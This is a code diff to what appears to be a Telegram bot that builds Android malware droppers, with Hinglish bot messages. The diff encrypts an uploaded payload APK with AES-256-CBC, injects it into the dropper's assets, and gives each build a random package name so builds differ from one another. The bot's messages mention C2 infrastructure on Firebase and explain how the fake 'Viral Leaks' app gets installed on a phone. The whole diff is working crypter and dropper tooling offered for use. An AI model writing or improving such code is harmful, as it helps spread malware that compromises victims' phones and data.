@@ -259,13 +259,22 @@ def encrypt_payload(data: bytes) -> bytes:
     cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(pad(data, AES.block_size))
 
-OLD_PKG = "com.gdww.ihwc.hpfv"
-NEW_PKG = "com.gdww.ihwc.hpfx"   # same length; avoids original-cert conflict on reinstall
+import string as _string
+import random as _random
 
-def _patch_pkg(data: bytes) -> bytes:
-    """Replace OLD_PKG with NEW_PKG in binary AXML (UTF-16LE strings)."""
+OLD_PKG = "com.gdww.ihwc.hpfv"
+_CHARS  = _string.ascii_lowercase + _string.digits   # a-z 0-9
+
+def _random_pkg() -> str:
+    """Generate a random same-length replacement package name."""
+    suffix = ''.join(_random.choices(_CHARS, k=4))
+    return f"com.gdww.ihwc.{suffix}"
+
+def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
+    """Replace OLD_PKG with new_pkg in binary AXML (UTF-16LE)."""
+    assert len(new_pkg) == len(OLD_PKG), "package name length must match"
     old = OLD_PKG.encode('utf-16-le')
-    new = NEW_PKG.encode('utf-16-le')
+    new = new_pkg.encode('utf-16-le')
     result = bytearray(data)
     pos = 0
     while True:
@@ -276,8 +285,10 @@ def _patch_pkg(data: bytes) -> bytes:
         pos = idx + len(new)
     return bytes(result)
 
-def rebuild_dropper(payload_bytes: bytes) -> bytes:
+def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
+    """Returns (apk_bytes, pkg_name)."""
     encrypted = encrypt_payload(payload_bytes)
+    new_pkg   = _random_pkg()
     buf = io.BytesIO()
     with zipfile.ZipFile(DROPPER_PATH, "r") as zin, \
          zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
@@ -288,9 +299,10 @@ def rebuild_dropper(payload_bytes: bytes) -> bytes:
             if item.filename == ASSET_NAME:
                 data = encrypted
             elif item.filename == "AndroidManifest.xml":
-                data = _patch_pkg(data)
+                data = _patch_pkg(data, new_pkg)
             zout.writestr(item, data)
-    return buf.getvalue()
+    log.info("Rebuilt dropper pkg=%s", new_pkg)
+    return buf.getvalue(), new_pkg
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
 
@@ -313,7 +325,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         "━━━━━━━━━━━━━━━━━━━\n"
         "Naya payload APK upload karo — main usse encrypt karke\n"
         "dropper ke andar Axyra replace kar dunga.\n\n"
-        "📦 *Dropper:* `com.gdww.ihwc.hpfv`\n"
+        "📦 *Dropper:* `com.gdww.ihwc.*` (random per build)\n"
         "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
         "📁 *Asset:* `assets/Axyra`\n\n"
         "Neeche menu se option chuno 👇",
@@ -346,8 +358,8 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "  2️⃣  AES-256-CBC se encrypt karunga\n"
             "  3️⃣  Random IV prepend karunga\n"
             "  4️⃣  Dropper ki `assets/Axyra` replace karunga\n"
-            "  5️⃣  Naya dropper wapas bheejunga\n\n"
-            "⚠️ *Note:* Install ke liye re-sign karna hoga.\n"
+            "  5️⃣  Random package name assign karunga\n"
+            "  6️⃣  v1+v2 sign karke wapas bheejunga\n\n"
             "Cancel karne ke liye /menu",
             parse_mode="Markdown"
         )
@@ -375,7 +387,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "━━━━━━━━━━━━━━━━━━━\n"
             f"*Dropper file:* {status}\n"
             f"*Dropper size:* {dropper_size} KB\n"
-            f"*Dropper pkg:* `com.gdww.ihwc.hpfv`\n"
+            f"*Dropper pkg:* `com.gdww.ihwc.<random>`\n"
             f"*Payload pkg:* `com.btmo.awws.hoag`\n\n"
             "*C2 Infrastructure:*\n"
             "  • Firebase: `toxicgen-f1d0c`\n"
@@ -464,7 +476,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await prog.edit_text("🔐 Encrypt ho raha hai + Axyra replace...")
 
     try:
-        new_dropper = rebuild_dropper(apk_bytes)
+        new_dropper, new_pkg = rebuild_dropper(apk_bytes)
     except Exception as e:
         log.exception("rebuild failed")
         await prog.edit_text(f"❌ Error: {e}")
@@ -489,12 +501,9 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             f"✅ *Dropper ready!*\n\n"
             f"📦 Payload: `{doc.file_name}`\n"
             f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
+            f"📦 Package: `{new_pkg}`\n"
             f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n"
-            f"✍️ Signature: {sign_note}\n\n"
-            f"⚠️ *Install tip:*\n"
-            f"Agar 'package invalid' aaye → pehle original Viral Leaks\n"
-            f"uninstall karo (Settings → Apps → Viral Leaks → Uninstall)\n"
-            f"phir ye wala install karo."
+            f"✍️ Signature: {sign_note}"
         ),
         parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([[
